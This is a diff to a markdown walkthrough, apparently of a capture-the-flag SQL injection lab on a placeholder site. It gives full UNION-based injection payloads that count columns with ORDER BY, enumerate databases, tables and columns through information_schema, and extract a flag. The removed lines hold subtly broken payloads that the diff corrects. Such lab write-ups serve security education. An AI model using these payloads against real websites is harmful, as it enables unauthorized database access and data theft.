@@ -18,81 +18,144 @@
 
 <hr>
 
-**First thing that you see when opening the site and it attracts your attention is this -> ***URL: XYZ.online/post.php?id=1*****
-**So first I try write "'" end of url query after that I'll see this error:**
+## Initial Discovery
+
+When opening the target site, the first thing that stands out is the
+following URL:
+
+    XYZ.online/post.php?id=1
+
+To test for SQL injection, I added a single quote (`'`) at the end of
+the parameter:
+
+**`?id=1'`**
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-1.png" alt="error page">
 
-**Actualy "'" works and we have vulnerable in this url.**
-**We broke the SQL query now we need to fix it. let's try ***URL: XYZ.online/post.php?id=1'+--+-***, it's worked:**
+This triggered an SQL error, confirming that the `id` parameter is
+vulnerable.
+
+Next, I attempted to fix the broken query using a comment sequence:
+
+**`?id=1'+--+-`**
+
+The page loaded successfully, confirming that the payload worked and the
+injection point is valid.
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-2.png" alt="returned 200 ok">
-
+  
 <hr>
 
-## Find number of columns
+## Finding the Number of Columns
 
-**In this section I pay to find number of columns and which of them are visiable for us:**
+To identify how many columns the backend query uses, I tested
+`ORDER BY`:
 
-- **Payloads:**
-    - 1: `URL: XYZ.online/post.php?id=1'+ORDER+BY+1+--+-` --> was returned same page.
-    - 2: `URL: XYZ.online/post.php?id=1'+ORDER+BY+2+--+-` --> was returned same page.
-    - ...
-    - 10:`URL: XYZ.online/post.php?id=1'+ORDER+BY+10+--+-`--> was returned same page.
-    - 11:`URL: XYZ.online/post.php?id=1'+ORDER+BY+11+--+-`--> ***was not returned same page.***
+    ?id=1'+ORDER+BY+1+--+-
+    ?id=1'+ORDER+BY+2+--+-
+    ...
+    ?id=1'+ORDER+BY+10+--+-
+    ?id=1'+ORDER+BY+11+--+-   ← breaks
 
-    
-### Find visiable columns:
-**To find visiable columns after finding number of columns we use these payloads:**
-
-- **Payloads**
-    - `URL: XYZ.online/post.php?id=1'+UNION+SELECT+"STR1"+"STR2"+"STR3"+"STR4"+"STR5"+"STR6"+"STR7"+"STR8"+"STR9"+"STR10"+--+-`
-    - `URL: XYZ.online/post.php?id=1'+UNION+SELECT+1+2+3+4+5+6+7+8+9+10+--+-`
-
-
-<p style="color:red;">There is difference between these two payload, What can be it? So if our columns type will be string, we should use "string" to find visiable columns else use numbers.</p>
+The query breaks at `ORDER BY 11`, so the table contains **10 columns**.
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-4.png" alt="Numbers payload">
 
-**Question: ***Why does not it work?*** At first may be you think if I used string payload it does work! but no, when our columns are string, they can cast int to string and show them, we have other point that were not attention to it. This site is not dynamic and just show first result of sql query, to solve this we should use below payload**
+<hr>
 
-**Payload : ***`URL: XYZ.online/post.php?id=1'+AND+1=2+UNION+SELECT+1+2+3+4+5+6+7+8+9+10+--+-`*****
+## Identifying Visible Columns
+
+To discover which columns are reflected on the page, I tested UNION
+payloads.
+
+First, with strings:
+
+**`?id=1'+UNION+SELECT+"STR1","STR2","STR3","STR4","STR5","STR6","STR7","STR8","STR9","STR10"+--+-`**
+
+Then with integers:
+
+**`?id=1'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10+--+-`**
+
+The numeric payload didn't work properly because the page only displays
+the **first row** of the SQL result.\
+To force it to show our injected row, we prevent the first row from
+returning:
+
+**`?id=1'+AND+1=2+UNION+SELECT+1,2,3,4,5,6,7,8,9,10+--+-`**
+
+This successfully revealed which columns are displayed.
+
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-5.png" alt="Numbers payload">
 
 <hr>
 
-### Find database name:
+## Extracting Database Names
 
-**To find database name we have different payloads but I used this one:**<br>
-***`URL: XYZ.online/post.php?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(SCHEMA_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.schemata+--+-`***
+To retrieve the list of databases, I used:
+
+    ?id=1'+AND+1=2+UNION+SELECT+"S1","S2",GROUP_CONCAT(SCHEMA_NAME),"S4","S5","S6","S7","S8","S9","S10"
+    FROM+information_schema.schemata--+-
+
+Among the results, the target database was:
+
+    sqli-level-1
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-6.png" alt="Numbers payload">
 
-**This payload returned all databases name, we are looking for ***"sqli-level-1"***. let's find database's tables:**
+<hr>
 
-***Payload: `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(TABLE_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.tables+WHERE+TABLE_SCHEMA='sqli-level-1'+--+-`***
+## Extracting Table Names
 
-- Tables:
-    - flag
-    - news
+Next, I listed the tables inside the target database:
+
+    ?id=1'+AND+1=2+UNION+SELECT+"S1","S2",GROUP_CONCAT(TABLE_NAME),"S4","S5","S6","S7","S8","S9","S10"
+    FROM+information_schema.tables
+    WHERE+TABLE_SCHEMA='sqli-level-1'--+-
+
+Tables found:
+
+-   `flag`
+-   `news`
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-7.png" alt="Numbers payload">
 
-**Now we know where is flag. Just we need to know columns of flag table to do this should use:**
+<hr>
 
-***Payload: `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(COLUMN_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.columns+WHERE+TABLE_SCHEMA='sqli-level-1'+AND+TABLE_NAME='flag'--+-`***
+## Extracting Column Names from the `flag` Table
 
-- Columns:
-    - id
-    - flag_text
+    ?id=1'+AND+1=2+UNION+SELECT+"S1","S2",GROUP_CONCAT(COLUMN_NAME),"S4","S5","S6","S7","S8","S9","S10"
+    FROM+information_schema.columns
+    WHERE+TABLE_SCHEMA='sqli-level-1'
+    AND+TABLE_NAME='flag'--+-
+
+Columns:
+
+-   `id`
+-   `flag_text`
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-8.png" alt="Numbers payload">
 
 <hr>
 
-**The last thing that we need is query to find flag actualy reterive flag from flag table:**
+## Retrieving the Flag
 
-***payload : `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(flag_text)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+sql-level-1.flag--+-`***
+Finally, to extract the actual flag:
+
+    ?id=1'+AND+1=2+UNION+SELECT+"S1","S2",GROUP_CONCAT(flag_text),"S4","S5","S6","S7","S8","S9","S10"
+    FROM+sqli-level-1.flag--+-
+
+This payload successfully returned the flag.
+
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-9.png" alt="Numbers payload">
+
+
+
+
+
+
+
+
+
+
